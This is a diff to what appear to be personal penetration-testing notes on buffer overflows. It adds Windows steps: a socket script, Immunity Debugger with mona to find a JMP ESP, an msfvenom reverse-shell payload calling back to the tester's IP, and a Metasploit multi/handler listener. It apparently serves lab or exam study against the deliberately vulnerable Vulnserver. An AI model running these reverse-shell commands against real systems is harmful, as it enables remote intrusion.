@@ -294,10 +294,20 @@ print(buff + eip + nop + buf)		# add 'buf' to print statement in script
 ./<program> < $(python <script.py)		# use this instead if program takes parameter instead of input
 # if works change payload  to something usefull (like cat <file>) and run again
 
-
-
-
-
+## in windows...
+https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
+write socket script
+open program in immunity debugger
+run wiremask in socket script on port and view EIP in debugger
+	!mona jmp -r ESP -m "<dllFile>.dll"		# in debugger to find jump value
+msfvenom -p windows/shell_reverse_tcp LHOST=<my IP> LPORT=5555 -b '\x00' -f python
+msfconsole
+	use multi/handler
+	set payload windows/shell_reverse_tcp
+	set lhost 0.0.0.0
+	set lport 5555
+	exploit
+# dir = ls | type = cat |
 
 
 
